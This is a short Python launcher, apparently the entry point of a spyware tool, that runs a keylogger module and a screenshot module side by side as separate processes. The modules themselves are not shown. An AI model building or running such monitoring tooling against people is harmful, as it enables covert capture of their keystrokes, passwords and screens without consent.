import multiprocessing
import os


def run_keylogger():
    os.system("python modules/keylogger.py")


def run_screenshot():
    os.system("python modules/screenshot.py")


if __name__ == "__main__":
    screenshot = multiprocessing.Process(target=run_screenshot)
    keylogger = multiprocessing.Process(target=run_keylogger)

    keylogger.start()
    screenshot.start()

    keylogger.join()
    screenshot.join()
